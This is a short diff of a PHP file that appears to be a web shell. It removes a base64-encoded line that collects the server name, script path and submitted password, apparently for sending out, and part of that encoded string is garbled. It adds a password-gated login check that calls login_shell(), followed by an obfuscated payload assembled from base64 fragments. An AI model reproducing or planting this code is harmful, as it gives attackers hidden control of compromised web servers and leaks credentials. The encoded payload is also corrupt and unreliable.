@@ -134,7 +134,20 @@ function send_email($email, $server, $path, $password) {
 
 // **Flush output after HTML is displayed**
 ob_end_flush();
-$decoded_code = base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");
+?>
+
+<?php
+    exit;
+}
+
+// Check if the user is logged in
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+        login_shell();
+    }
+}
 $z .= "DQpA";
 $z .= "aW5p";
 $z .= "X3Nl";
